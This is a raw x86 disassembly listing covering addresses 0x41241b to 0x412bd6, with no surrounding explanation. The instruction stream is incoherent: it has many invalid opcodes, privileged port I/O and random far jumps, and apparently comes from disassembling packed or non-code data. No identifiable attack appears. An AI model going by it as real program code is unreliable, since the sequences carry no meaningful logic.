  41241b:	lods   al,BYTE PTR ds:[esi]
  41241c:	sub    eax,0xb616517b
  412421:	add    eax,0xa1e38c7e
  412426:	push   0x42
  412428:	inc    esp
  412429:	cmp    ebp,DWORD PTR [eax-0x45]
  41242c:	faddp  st(4),st
  41242e:	jge    0x41249e
  412430:	mov    al,BYTE PTR [ebx-0x49]
  412433:	hlt    
  412434:	jle    0x4123df
  412436:	test   eax,0x55f56c76
  41243b:	cwde   
  41243c:	(bad)  
  41243d:	push   ebx
  41243e:	daa    
  41243f:	xchg   esi,eax
  412440:	add    BYTE PTR [eax+0x62],bh
  412443:	mov    al,ds:0x9b54b1b8
  412448:	mov    eax,ds:0xd6afb030
  41244d:	mov    ds:0xea286ad8,al
  412452:	loop   0x4123dc
  412454:	aaa    
  412455:	repnz mov dh,0xad
  412458:	adc    dl,cl
  41245a:	sbb    esp,edx
  41245c:	sub    esi,edi
  41245e:	lds    edi,FWORD PTR [ebx+ebx*1-0x7e]
  412462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412463:	ficom  DWORD PTR [ecx]
  412465:	jle    0x41245c
  412467:	mov    DWORD PTR [eax],edi
  412469:	dec    esi
  41246a:	adc    esp,0xffffffb6
  41246d:	pop    ebp
  41246e:	inc    ebp
  41246f:	dec    edx
  412470:	jl     0x412487
  412472:	push   ebx
  412473:	fld    QWORD PTR ds:0xb4ba286d
  412479:	outs   dx,BYTE PTR ds:[esi]
  41247a:	push   es
  41247b:	dec    edx
  41247c:	adc    edi,esi
  41247e:	mov    al,0x7b
  412480:	out    0xb1,al
  412482:	fstp   st(2)
  412484:	mov    dh,0x89
  412486:	and    DWORD PTR [ebx-0x3749d649],ebx
  41248c:	test   al,0xb
  41248e:	(bad)  
  41248f:	lods   eax,DWORD PTR ds:[esi]
  412490:	push   cs
  412491:	push   0xf651f213
  412496:	in     eax,0xc1
  412498:	lods   al,BYTE PTR ds:[esi]
  412499:	mov    dh,0xd
  41249b:	add    BYTE PTR [edi+0x2a702669],dh
  4124a1:	mov    bl,ch
  4124a3:	add    esi,DWORD PTR [ebx-0x39245523]
  4124a9:	push   esi
  4124aa:	mov    esp,0x7196aea8
  4124af:	mov    ah,0xe7
  4124b1:	mov    bh,0x85
  4124b3:	mov    dh,0x81
  4124b5:	cmp    bl,BYTE PTR [esp+esi*2]
  4124b8:	xor    eax,0xbbc23240
  4124bd:	push   0x685dadca
  4124c2:	fwait
  4124c3:	inc    eax
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	ins    DWORD PTR es:[edi],dx
  4124c6:	dec    ebp
  4124c7:	pop    esp
  4124c8:	xor    DWORD PTR [eax],esp
  4124ca:	aad    0xad
  4124cc:	jno    0x4124a9
  4124ce:	add    BYTE PTR [ecx+0x7d],0x31
  4124d2:	and    al,0x5d
  4124d4:	retf   
  4124d5:	(bad)  
  4124d6:	sbb    BYTE PTR [ebp+0x56360fc2],ch
  4124dc:	jmp    0xebb5:0x936e5fa5
  4124e3:	fnsave [esi+0x39b18dda]
  4124e9:	jbe    0x4124dc
  4124eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ec:	(bad)  [ebp-0x4935a0e6]
  4124f2:	ins    DWORD PTR es:[edi],dx
  4124f3:	sbb    eax,0x466e86b4
  4124f8:	dec    esp
  4124f9:	inc    esp
  4124fa:	(bad)  
  4124fc:	mov    ?,WORD PTR [edx+0x4b]
  4124ff:	rol    dh,0xc2
  412502:	pop    ds
  412503:	push   0xffffff90
  412505:	nop
  412506:	dec    eax
  412507:	push   edx
  412508:	xchg   ebp,eax
  412509:	test   eax,0xb3543250
  41250e:	push   es
  41250f:	test   ebp,0x6b6dd15c
  412515:	sbb    eax,0x16817e8
  41251a:	inc    ebx
  41251b:	pop    esi
  41251c:	adc    eax,0xf5a8585c
  412521:	adc    al,ah
  412523:	mov    edi,0xa0e8361b
  412528:	jbe    0x4124fd
  41252a:	popa   
  41252b:	data16 es or al,0xad
  41252f:	and    eax,0xb82c2ed5
  412534:	mov    BYTE PTR [esp+edi*1+0x1a5ec394],ch
  41253b:	fmul   QWORD PTR [edx+0x51]
  41253e:	mov    eax,0x259e6473
  412543:	pop    esi
  412544:	and    esp,DWORD PTR [ebp+0x1f]
  412547:	pusha  
  412548:	mov    ebx,0x9a9000d1
  41254d:	add    esp,DWORD PTR [ebx-0x9]
  412550:	fnsave [ebp+0x50]
  412553:	stos   BYTE PTR es:[edi],al
  412554:	fcomp  DWORD PTR [edx+0x623b6ed4]
  41255a:	shl    DWORD PTR [esi],cl
  41255c:	pop    edx
  41255d:	mov    bh,0x2
  41255f:	mov    bh,0x1a
  412561:	(bad)  
  412562:	out    dx,al
  412563:	inc    eax
  412564:	jnp    0x412581
  412566:	fist   DWORD PTR [esi+0x59ef9616]
  41256c:	pop    eax
  41256d:	cld    
  41256e:	add    DWORD PTR [edx+0x2805d5d7],0x32
  412575:	das    
  412576:	jne    0x4125cb
  412578:	and    DWORD PTR [esp+edx*8],esp
  41257b:	add    BYTE PTR [edi],ch
  41257d:	ins    DWORD PTR es:[edi],dx
  41257e:	ins    DWORD PTR es:[edi],dx
  41257f:	mov    ebx,0xca108050
  412584:	sbb    al,BYTE PTR [edx+0x5644f226]
  41258a:	adc    eax,esp
  41258c:	add    ch,BYTE PTR [ebp-0x3aea8f56]
  412592:	call   0x69ae944d
  412597:	push   edi
  412598:	mov    bl,0x32
  41259a:	xor    DWORD PTR [edx+edx*4],edx
  41259d:	jbe    0x412533
  41259f:	dec    ecx
  4125a0:	out    dx,al
  4125a1:	jno    0x4125fe
  4125a3:	call   0xa1071450
  4125a8:	into   
  4125a9:	push   ds
  4125aa:	mov    BYTE PTR [edx+0x1362fda1],al
  4125b0:	mov    esp,0x6009cfa0
  4125b5:	(bad)  
  4125b6:	enter  0x76e2,0x69
  4125ba:	mov    ds:0x9bd31674,eax
  4125bf:	pusha  
  4125c0:	outs   dx,DWORD PTR ds:[esi]
  4125c1:	and    edx,DWORD PTR [edx+0x2a]
  4125c4:	push   ebx
  4125c5:	mov    dh,0x8d
  4125c7:	(bad)  
  4125c8:	fisubr DWORD PTR [esp+esi*2-0x3]
  4125cc:	jae    0x4125a3
  4125ce:	sub    eax,DWORD PTR [ecx-0x3e]
  4125d1:	mov    cl,0xd4
  4125d3:	and    dh,BYTE PTR [esi]
  4125d5:	sub    ch,BYTE PTR [esi+ebx*2-0x74]
  4125d9:	jmp    0x4125c8
  4125db:	inc    esi
  4125dc:	mov    ebx,0x55ef8ab0
  4125e1:	cmp    ch,ah
  4125e3:	xchg   ebp,eax
  4125e4:	inc    DWORD PTR [edi+ebx*8]
  4125e7:	clc    
  4125e8:	adc    DWORD PTR [edi-0x240175e6],esi
  4125ee:	seta   BYTE PTR [esi-0x55c5e922]
  4125f5:	sbb    ah,BYTE PTR ss:[eax]
  4125f8:	sbb    BYTE PTR [ebp-0x9],0x2b
  4125fc:	cmp    eax,0xdb6372c0
  412601:	xchg   ebp,eax
  412602:	adc    eax,0x6fc3b286
  412607:	push   edi
  412608:	ror    BYTE PTR [eax-0x13ecbfa6],cl
  41260e:	mov    esp,0x6e8aba0f
  412613:	xchg   esp,eax
  412614:	or     bl,BYTE PTR [esi]
  412616:	jecxz  0x41264a
  412618:	push   0xb6362b2a
  41261d:	ss adc eax,0x78958299
  412623:	std    
  412624:	cmp    al,0xa5
  412626:	mov    dh,0xa3
  412628:	pusha  
  412629:	mov    eax,ds:0x11aa7542
  41262e:	es ins BYTE PTR es:[edi],dx
  412630:	xor    eax,0x44cbb744
  412635:	cdq    
  412636:	fst    QWORD PTR [edx+0x79]
  412639:	pop    ebx
  41263a:	push   ebp
  41263b:	jbe    0x412612
  41263d:	lods   eax,DWORD PTR ds:[esi]
  41263e:	inc    ecx
  41263f:	inc    edx
  412640:	mov    eax,ds:0x830474b8
  412645:	jl     0x4126b4
  412647:	or     ebx,DWORD PTR [ebx+0x59a5c2a0]
  41264d:	add    al,0x11
  41264f:	(bad)  
  412650:	cld    
  412651:	xor    eax,0x98b6b700
  412656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412657:	push   0x4890f9da
  41265c:	iret   
  41265d:	sbb    ch,BYTE PTR [edx-0x7e]
  412660:	mov    edx,0x29a9587a
  412665:	out    dx,al
  412666:	lods   eax,DWORD PTR ds:[esi]
  412667:	add    ah,BYTE PTR [ecx+0x6f02eb74]
  41266d:	dec    edx
  41266e:	retf   
  41266f:	add    esp,ecx
  412671:	pop    edi
  412672:	push   edx
  412673:	sbb    edx,DWORD PTR [ecx+0x2d]
  412676:	bound  edi,QWORD PTR [eax+0x10]
  412679:	enter  0xb695,0xd5
  41267d:	push   eax
  41267e:	ins    BYTE PTR es:[edi],dx
  41267f:	repnz xor eax,0xffffffa4
  412683:	push   edx
  412684:	jnp    0x4126f7
  412686:	mov    dh,0xb0
  412688:	ins    DWORD PTR es:[edi],dx
  412689:	fisttp DWORD PTR [ebx+0x4832f5bc]
  41268f:	sbb    DWORD PTR [ebx+0x25],0xffffff8f
  412693:	inc    esp
  412694:	pop    ebp
  412695:	(bad)  
  412696:	(bad)  
  412697:	lds    ecx,FWORD PTR [ebp-0x4]
  41269a:	mov    dh,0x1a
  41269c:	pop    es
  41269d:	push   0x73
  41269f:	sub    eax,0x5f6d06a8
  4126a4:	jle    0x4126e6
  4126a6:	scas   eax,DWORD PTR es:[edi]
  4126a7:	outs   dx,DWORD PTR ds:[esi]
  4126a8:	fdivr  QWORD PTR [edx+0x42b1b88]
  4126ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126af:	test   BYTE PTR [edi+0x9004733],bl
  4126b5:	aam    0xb6
  4126b7:	aam    0x96
  4126b9:	sar    DWORD PTR [eax-0x793eb874],cl
  4126bf:	outs   dx,BYTE PTR ds:[esi]
  4126c0:	shl    DWORD PTR [edx],1
  4126c2:	mov    dh,0x42
  4126c4:	jne    0x412646
  4126c6:	leave  
  4126c7:	call   0x9b8d:0xbb451adb
  4126ce:	popf   
  4126cf:	or     esp,DWORD PTR [ebx]
  4126d1:	es repz out dx,eax
  4126d4:	popa   
  4126d5:	adc    eax,eax
  4126d7:	jbe    0x4126a5
  4126d9:	arpl   WORD PTR [ebx+ecx*1+0x77],si
  4126dd:	(bad)  
  4126de:	mov    al,ds:0x5b111df7
  4126e3:	push   edi
  4126e4:	jg     0x412746
  4126e6:	mov    eax,ds:0x9bd36d62
  4126eb:	add    BYTE PTR [esi+0x4a51f40b],dh
  4126f1:	sti    
  4126f2:	push   edi
  4126f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126f4:	jmp    0xa250:0x15d8833e
  4126fb:	imul   ebx,ecx,0xffffff9f
  4126fe:	sbb    ah,BYTE PTR [edx+0x7]
  412701:	mov    al,0xd0
  412703:	ss clc 
  412705:	sbb    eax,0x76fc9f06
  41270a:	inc    ecx
  41270b:	ins    BYTE PTR es:[edi],dx
  41270c:	fstp   QWORD PTR [ecx+0x31]
  41270f:	mov    esp,DWORD PTR ds:0x2fb94e65
  412715:	mov    dh,0x7c
  412717:	imul   ebp,DWORD PTR [edx],0x28
  41271a:	inc    edx
  41271b:	pop    edi
  41271c:	ret    0x11
  41271f:	cli    
  412720:	or     ebp,DWORD PTR fs:[ebp-0x5f]
  412724:	ins    DWORD PTR es:[edi],dx
  412725:	rcr    DWORD PTR [ebx],0x9d
  412728:	or     edx,eax
  41272a:	and    eax,0x50bb35f8
  41272f:	push   ebx
  412730:	lds    esi,FWORD PTR [edx-0x22c43e3c]
  412736:	and    edi,DWORD PTR ds:0xdb8db6f8
  41273c:	inc    edx
  41273d:	(bad)  
  41273e:	inc    esi
  41273f:	(bad)  
  412740:	cmp    ebx,ecx
  412742:	xchg   esi,eax
  412743:	fadd   st(5),st
  412745:	inc    dl
  412747:	(bad)  
  412748:	mov    eax,0x52f141d0
  41274d:	mov    ds:0xbbc7f266,eax
  412752:	mov    ah,0x81
  412754:	loopne 0x41272c
  412756:	jg     0x41276e
  412758:	test   eax,0x729cecfa
  41275d:	fcmovnbe st,st(2)
  41275f:	push   esi
  412760:	pop    es
  412761:	dec    edi
  412762:	add    ah,0xce
  412765:	ret    0x7d56
  412768:	dec    ebp
  412769:	(bad)  
  41276a:	add    BYTE PTR [edx],bh
  41276c:	mov    al,ds:0xddafaf34
  412771:	sbb    al,BYTE PTR [ebp+0x35e02bad]
  412777:	pop    ecx
  412778:	xchg   esi,eax
  412779:	mov    ch,0x1d
  41277b:	shl    ch,1
  41277d:	inc    ecx
  41277e:	test   eax,0xcfbe8b6a
  412783:	outs   dx,BYTE PTR ss:[esi]
  412785:	push   es
  412786:	sbb    ebx,ebx
  412788:	mov    dh,0x2
  41278a:	xchg   BYTE PTR [ebp+eax*2+0x6e],dh
  41278e:	cmc    
  41278f:	add    ebx,DWORD PTR [eax]
  412791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412792:	or     eax,0xf1d152c0
  412797:	fimul  WORD PTR [edx+0xf]
  41279a:	jns    0x412757
  41279c:	sub    eax,0x3baa6e94
  4127a1:	out    dx,eax
  4127a2:	ret    0xc05e
  4127a5:	add    ch,BYTE PTR [esi+0x2d]
  4127a8:	and    eax,DWORD PTR [ebp+0x3444c36d]
  4127ae:	xchg   ebx,eax
  4127af:	jno    0x4127a3
  4127b1:	pop    ecx
  4127b2:	imul   DWORD PTR [edx]
  4127b4:	pusha  
  4127b5:	pop    es
  4127b6:	shl    DWORD PTR [ebp+0x6b3a2510],0xb7
  4127bd:	jbe    0x41279a
  4127bf:	push   0xffffffe2
  4127c1:	fnstenv [esi+eiz*1]
  4127c4:	dec    edx
  4127c5:	call   0x362e:0xc098b984
  4127cc:	ss push ss
  4127ce:	sbb    ch,BYTE PTR [ebx-0x3b60a1c0]
  4127d4:	inc    ebp
  4127d5:	not    BYTE PTR [ecx-0x4c]
  4127d8:	test   al,0x16
  4127da:	mov    esp,DWORD PTR [ebx-0x77]
  4127dd:	pop    edx
  4127de:	mov    dh,0xda
  4127e0:	lods   eax,DWORD PTR ds:[esi]
  4127e1:	jp     0x4127f4
  4127e3:	stos   BYTE PTR es:[edi],al
  4127e4:	dec    eax
  4127e5:	sahf   
  4127e6:	fmul   QWORD PTR [eax]
  4127e8:	cmp    eax,0x5b76c7d2
  4127ed:	mov    DWORD PTR es:[esi-0x3573b078],eax
  4127f4:	mov    bh,0x80
  4127f6:	clc    
  4127f7:	ins    DWORD PTR es:[edi],dx
  4127f8:	jmp    0x4127a2
  4127fa:	(bad)  [edi+0x51d69d53]
  412800:	xchg   DWORD PTR [ecx-0x4957e52f],edi
  412806:	or     BYTE PTR [esi+0x87e2918],dh
  41280c:	aam    0xb0
  41280e:	ins    DWORD PTR es:[edi],dx
  41280f:	lods   eax,DWORD PTR ds:[esi]
  412810:	xchg   bp,ax
  412812:	loop   0x4127db
  412814:	and    dl,dh
  412816:	xor    ah,BYTE PTR [ecx]
  412818:	lea    eax,[esi-0x4c]
  41281b:	mov    al,0x5e
  41281d:	push   eax
  41281e:	jbe    0x412867
  412820:	mov    bh,0x3c
  412822:	sbb    dl,BYTE PTR [eax-0x72]
  412825:	fimul  DWORD PTR [esi]
  412827:	push   edx
  412828:	mov    ecx,0x536dd216
  41282d:	mov    cl,0xdd
  41282f:	jno    0x41286a
  412831:	mov    cl,0xbf
  412833:	pushf  
  412834:	mov    eax,0xb8ad069b
  412839:	mov    al,0xb5
  41283b:	dec    ebx
  41283c:	mov    esp,0x95a1dede
  412841:	add    eax,0xc607d6c4
  412846:	inc    edx
  412847:	add    edi,ebp
  412849:	daa    
  41284a:	out    0x78,eax
  41284c:	retf   
  41284d:	stc    
  41284e:	(bad)  
  41284f:	fiadd  DWORD PTR [ebx]
  412851:	mov    dh,0x6d
  412853:	aad    0xd6
  412855:	xchg   edx,eax
  412856:	fs test al,0xee
  412859:	call   0xf2d2:0xede0ed59
  412860:	rcl    ah,cl
  412862:	and    ebp,edi
  412864:	add    BYTE PTR [ebp-0x2d69252b],bl
  41286a:	lods   eax,DWORD PTR ds:[esi]
  41286b:	mov    dh,0xb
  41286d:	test   DWORD PTR [ebp+0x2be43d9b],eax
  412873:	out    dx,al
  412874:	pop    es
  412875:	lock pop ecx
  412877:	mov    ebx,esp
  412879:	fisubr DWORD PTR [eax+0xa]
  41287c:	sub    eax,0xcdd8cc83
  412881:	mov    ds:0x9410b60a,al
  412886:	das    
  412887:	mov    ds:0x753200a1,eax
  41288c:	cmc    
  41288d:	inc    esp
  41288e:	mov    ecx,0xd1176abb
  412893:	dec    ecx
  412894:	aas    
  412895:	icebp  
  412896:	scas   al,BYTE PTR es:[edi]
  412897:	or     dl,BYTE PTR [ebx+eax*4+0x6b60da5b]
  41289e:	sub    ebx,edi
  4128a0:	xor    bl,ah
  4128a2:	in     eax,dx
  4128a3:	clc    
  4128a4:	and    ah,BYTE PTR [edx-0x25]
  4128a7:	mov    dh,0x8d
  4128a9:	gs sahf 
  4128ab:	rol    DWORD PTR [ebx],cl
  4128ad:	adc    bl,BYTE PTR [edx]
  4128af:	rol    BYTE PTR [esp+edx*8+0x38],0x1b
  4128b4:	ins    DWORD PTR es:[edi],dx
  4128b5:	push   ebx
  4128b6:	jno    0x4128e4
  4128b8:	sub    eax,0x6201d70d
  4128bd:	test   cl,0xb0
  4128c0:	mov    cl,0xd0
  4128c2:	outs   dx,BYTE PTR ds:[esi]
  4128c3:	stos   BYTE PTR es:[edi],al
  4128c4:	xor    eax,ebx
  4128c6:	je     0x412880
  4128c8:	inc    edx
  4128c9:	pushf  
  4128ca:	(bad)  
  4128cb:	mov    al,ds:0x144a16dd
  4128d0:	mov    dl,0xb0
  4128d2:	xor    bl,BYTE PTR ds:0x1ad89b02
  4128d8:	push   0xffffffeb
  4128da:	lds    edx,FWORD PTR [edi]
  4128dc:	mov    bl,0xdb
  4128de:	add    al,0x79
  4128e0:	inc    ecx
  4128e1:	retf   
  4128e2:	fild   DWORD PTR [ebp-0xc11a24a]
  4128e8:	adc    DWORD PTR [ebp+0x29],ecx
  4128eb:	mov    ecx,ebx
  4128ed:	xor    al,0x77
  4128ef:	out    dx,eax
  4128f0:	pop    ds
  4128f1:	aad    0x50
  4128f3:	pop    ebp
  4128f4:	push   0x17
  4128f6:	push   cs
  4128f7:	dec    ch
  4128f9:	enter  0xb637,0x5b
  4128fd:	loope  0x4128b5
  4128ff:	dec    ecx
  412900:	xchg   ebp,eax
  412901:	inc    esp
  412902:	inc    edi
  412903:	inc    esi
  412904:	popa   
  412905:	adc    BYTE PTR [ebp-0x526a0a40],0xf
  41290c:	in     al,dx
  41290d:	or     BYTE PTR [edi],dh
  41290f:	stos   BYTE PTR es:[edi],al
  412910:	mov    dh,0xf9
  412912:	xchg   edx,eax
  412913:	aaa    
  412914:	test   eax,0x883adb76
  412919:	imul   esi,DWORD PTR [edx+0x4e],0x57386cef
  412920:	pop    esp
  412921:	xchg   ebp,eax
  412922:	pop    ebx
  412923:	test   eax,0xddd7b635
  412928:	xchg   DWORD PTR [ebp+eax*8+0x6e],edi
  41292c:	lds    ebx,FWORD PTR [ebp+0x5]
  41292f:	cmp    ebp,DWORD PTR [edx-0x623f6829]
  412935:	jo     0x4128e3
  412937:	gs stos DWORD PTR es:[edi],eax
  412939:	inc    ecx
  41293a:	ins    DWORD PTR es:[edi],dx
  41293b:	pop    esp
  41293c:	call   0xad6e:0x343db56b
  412943:	mov    esp,DWORD PTR [ecx+eiz*8+0x72]
  412947:	adc    al,0xd4
  412949:	call   0xbac92f5b
  41294e:	mov    cl,0x6d
  412950:	add    BYTE PTR [ebx],bh
  412952:	ds (bad) 
  412954:	cld    
  412955:	fidivr DWORD PTR [esi+0x1a]
  412958:	push   ecx
  412959:	pop    ss
  41295a:	ins    DWORD PTR es:[edi],dx
  41295b:	mov    cl,0x53
  41295d:	jmp    0x16b6:0xd954b4a4
  412964:	xchg   esi,eax
  412965:	or     DWORD PTR [edi+0x3d],0xffffff8e
  412969:	hlt    
  41296a:	inc    eax
  41296b:	fisub  DWORD PTR [esi+esi*4-0x7a92e56b]
  412972:	sbb    dh,BYTE PTR [esi-0xe]
  412975:	fnstsw WORD PTR [esi-0x6e]
  412978:	inc    esi
  412979:	arpl   WORD PTR [ecx+0x2f39e6c0],di
  41297f:	cli    
  412980:	lods   eax,DWORD PTR ds:[esi]
  412981:	mov    dh,BYTE PTR [edx-0x4a]
  412984:	test   ebp,ebp
  412986:	ret    0x7c88
  412989:	mov    eax,ds:0x4f411133
  41298e:	xor    al,0x6e
  412990:	push   eax
  412991:	dec    edx
  412992:	inc    ecx
  412993:	pop    ebx
  412994:	fisub  DWORD PTR [ebp+0x55]
  412997:	add    DWORD PTR [ebx],0xffffff86
  41299a:	or     al,0xa8
  41299c:	fild   DWORD PTR [edx-0x5f]
  41299f:	pop    es
  4129a0:	cmp    bh,dl
  4129a2:	mov    eax,ds:0x16dde925
  4129a7:	mov    dh,0xae
  4129a9:	push   ecx
  4129aa:	push   ss
  4129ab:	sbb    bl,BYTE PTR ds:0x1b050e61
  4129b1:	push   ebp
  4129b2:	or     ecx,DWORD PTR [ebx]
  4129b4:	pop    ebx
  4129b5:	inc    ebx
  4129b6:	fmul   st(6),st
  4129b8:	and    ebp,DWORD PTR [ebp+0xa]
  4129bb:	mov    al,ds:0xdb6d66a6
  4129c0:	(bad)  
  4129c1:	mov    dh,0xb0
  4129c3:	mov    eax,ds:0xf17408b4
  4129c8:	inc    esp
  4129c9:	push   esp
  4129ca:	sub    DWORD PTR [edi-0x5d],ebp
  4129cd:	add    BYTE PTR ds:0xf2cc622d,ch
  4129d3:	pop    ecx
  4129d4:	cmp    al,dh
  4129d6:	sub    BYTE PTR [esi+0x74],bh
  4129d9:	popa   
  4129da:	dec    eax
  4129db:	(bad)  
  4129dd:	fisubr DWORD PTR [edx+esi*1-0x27a69210]
  4129e4:	cmp    al,BYTE PTR [ecx+0x3de335eb]
  4129ea:	xchg   esp,eax
  4129eb:	mov    bl,0xaa
  4129ed:	mov    ch,0x6d
  4129ef:	stc    
  4129f0:	(bad)  
  4129f1:	xor    BYTE PTR [edi],bh
  4129f3:	loope  0x412a74
  4129f5:	add    BYTE PTR [edi+eiz*1-0x1],bh
  4129f9:	or     esp,DWORD PTR [ebx+0x52ea3bf2]
  4129ff:	mov    ebx,0xd158d2da
  412a04:	dec    edx
  412a05:	push   es
  412a06:	mov    esi,0xda4d7921
  412a0b:	push   esp
  412a0c:	mov    ah,0x6d
  412a0e:	imul   ebp,DWORD PTR [eax-0x5bc9089e],0x57
  412a15:	(bad)  
  412a16:	fsubr  DWORD PTR [edx-0x5e]
  412a19:	arpl   WORD PTR [edi-0x27079809],bp
  412a1f:	fcom   DWORD PTR [esi-0x78f7584a]
  412a25:	ret    0x65e7
  412a28:	push   cs
  412a29:	xchg   ebx,eax
  412a2a:	push   0x40
  412a2c:	pop    ebx
  412a2d:	and    bl,dl
  412a2f:	daa    
  412a30:	jg     0x412aa8
  412a32:	sub    eax,0x56ed8544
  412a37:	mov    eax,0x13150a3f
  412a3c:	push   cs
  412a3d:	dec    eax
  412a3e:	leave  
  412a3f:	adc    al,0x1d
  412a41:	ins    DWORD PTR es:[edi],dx
  412a42:	fwait
  412a43:	stos   BYTE PTR es:[edi],al
  412a44:	fisubr DWORD PTR [esi-0x1d]
  412a47:	mov    cl,0x86
  412a49:	in     al,dx
  412a4a:	enter  0xef17,0x2
  412a4e:	fsubr  DWORD PTR [esi+0x35]
  412a51:	add    DWORD PTR ds:0x8b9e94ee,esp
  412a57:	mov    eax,ds:0x6e8bb638
  412a5c:	rcl    BYTE PTR [edi-0x5],1
  412a5f:	or     eax,0x3545ec8c
  412a64:	adc    DWORD PTR [eax+0x26b76b6d],esp
  412a6a:	popa   
  412a6b:	push   ecx
  412a6c:	pop    ecx
  412a6d:	xchg   ebp,eax
  412a6e:	sbb    eax,edx
  412a70:	in     al,0x5d
  412a72:	clc    
  412a73:	jmp    0xb9a0:0x50025956
  412a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a7b:	std    
  412a7c:	and    DWORD PTR [eax],ebx
  412a7e:	push   edx
  412a7f:	fld    TBYTE PTR [esi+0x7d]
  412a82:	int    0xef
  412a84:	cmp    dh,ch
  412a86:	or     edx,DWORD PTR [ebp*4-0x723fca62]
  412a8d:	ins    DWORD PTR es:[edi],dx
  412a8e:	stc    
  412a8f:	retf   
  412a90:	cmc    
  412a91:	add    al,bl
  412a93:	mov    esp,0x4f9f50a4
  412a98:	addr16 push esp
  412a9a:	fstp   st(2)
  412a9c:	mov    dh,0xb1
  412a9e:	and    al,bh
  412aa0:	xor    BYTE PTR [edi+0x5f],dh
  412aa3:	sahf   
  412aa4:	adc    DWORD PTR [esi+0x4636d010],esi
  412aaa:	jb     0x412b1a
  412aac:	repnz mov bh,0xae
  412aaf:	bound  esi,QWORD PTR [ebp+0x6b]
  412ab2:	mov    bh,0x85
  412ab4:	jae    0x412aec
  412ab6:	jmp    0x6c1f183b
  412abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412abc:	sub    ebx,DWORD PTR [ebx-0x5b]
  412abf:	push   0xffffffa1
  412ac1:	shl    ah,1
  412ac3:	push   ss
  412ac4:	xchg   ebx,eax
  412ac5:	inc    esi
  412ac6:	add    ebx,ebp
  412ac8:	stos   BYTE PTR es:[edi],al
  412ac9:	fisubr DWORD PTR [esi-0x35]
  412acc:	call   0xe63be13e
  412ad1:	add    ch,bh
  412ad3:	push   0xffffffcb
  412ad5:	jg     0x412b40
  412ad7:	jbe    0x412b2f
  412ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ada:	imul   eax,DWORD PTR [eax],0x46005c17
  412ae0:	push   esp
  412ae1:	scas   eax,DWORD PTR es:[edi]
  412ae2:	test   eax,0x5c507410
  412ae7:	mov    edx,esi
  412ae9:	xchg   esp,eax
  412aea:	mul    bl
  412aec:	fsubr  DWORD PTR [eax+0x37]
  412aef:	pop    edx
  412af0:	cmp    edi,DWORD PTR [edi]
  412af2:	mov    ebx,0x9c394ae2
  412af7:	dec    ebx
  412af8:	add    eax,0x39e85c68
  412afd:	icebp  
  412afe:	iret   
  412aff:	shl    DWORD PTR [ebx],cl
  412b01:	ds sbb ebp,edx
  412b04:	mov    dh,0x6d
  412b06:	out    dx,eax
  412b07:	daa    
  412b08:	xor    eax,0x4a11da3a
  412b0d:	pop    ds
  412b0e:	into   
  412b0f:	xchg   esi,eax
  412b10:	jne    0x412b6d
  412b12:	sub    bl,BYTE PTR [ebx]
  412b14:	scas   al,BYTE PTR es:[edi]
  412b15:	add    al,0x71
  412b17:	or     ch,dh
  412b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b1a:	iret   
  412b1b:	mov    dh,0xb0
  412b1d:	push   ecx
  412b1e:	mov    esi,0xdf00b5d3
  412b23:	outs   dx,BYTE PTR ds:[esi]
  412b24:	int3   
  412b25:	std    
  412b26:	sub    ebp,DWORD PTR [eax+0x32]
  412b29:	ins    DWORD PTR es:[edi],dx
  412b2a:	imul   esp,DWORD PTR [edx],0xffffff8a
  412b2d:	push   ss
  412b2e:	sbb    DWORD PTR [eax+ebp*8],ebp
  412b31:	jecxz  0x412b8e
  412b33:	adc    BYTE PTR [ebp+eax*4-0x4e],ch
  412b37:	push   ss
  412b38:	loopne 0x412af8
  412b3a:	sahf   
  412b3b:	jb     0x412ae2
  412b3d:	or     ecx,DWORD PTR ds:0x7c3adc05
  412b43:	jnp    0x412aef
  412b45:	pop    edi
  412b46:	adc    eax,0xa81b6db1
  412b4b:	call   0x86b5:0x6dd49047
  412b52:	mov    dh,0xb0
  412b54:	jmp    0x71bb44da
  412b59:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  412b5b:	xchg   ebp,eax
  412b5c:	test   eax,0xb6b6d16d
  412b61:	cs pop ss
  412b63:	and    DWORD PTR [ebp+edi*1+0x35],esi
  412b67:	sahf   
  412b68:	(bad)
  412b6b:	arpl   WORD PTR [esi],sp
  412b6d:	imul   eax,DWORD PTR [eax-0x29],0xc4536f7b
  412b74:	lods   eax,DWORD PTR ds:[esi]
  412b75:	push   ecx
  412b76:	je     0x412bc8
  412b78:	cwde   
  412b79:	(bad)  
  412b7a:	cmp    BYTE PTR [ecx*1+0x4b65858],dl
  412b81:	and    BYTE PTR [edx+0x40],dh
  412b84:	test   DWORD PTR [edx+0x4b],edx
  412b87:	test   al,0xdd
  412b89:	sbb    al,0x1b
  412b8b:	cdq    
  412b8c:	jmp    0x412b0f
  412b8e:	dec    ebp
  412b8f:	mov    WORD PTR [esi],?
  412b91:	mov    edi,0x35b0ba8b
  412b96:	mov    BYTE PTR [eax-0x70e011a0],dh
  412b9c:	cmp    DWORD PTR [ebp+ebp*2+0x20e9844b],esi
  412ba3:	dec    ebp
  412ba4:	int3   
  412ba5:	and    esi,0xffffffbe
  412ba8:	outs   dx,BYTE PTR ds:[esi]
  412ba9:	push   eax
  412baa:	mov    edx,0x542e2f5
  412baf:	dec    ebp
  412bb0:	sub    ebx,edx
  412bb2:	fsub   QWORD PTR [esi]
  412bb4:	add    BYTE PTR [eax+0x1680dadd],dh
  412bba:	dec    esp
  412bbb:	add    eax,0xedbcbc17
  412bc0:	sub    BYTE PTR [eax-0x13f45e8b],bh
  412bc6:	jl     0x412bb6
  412bc8:	jmp    DWORD PTR ds:0xa5c50d4b
  412bce:	lods   eax,DWORD PTR ds:[esi]
  412bcf:	jge    0x412c39
  412bd1:	mov    al,ch
  412bd3:	mov    ch,0x9d
  412bd5:	aas    
  412bd6:	addr16 call 0x2ceee206
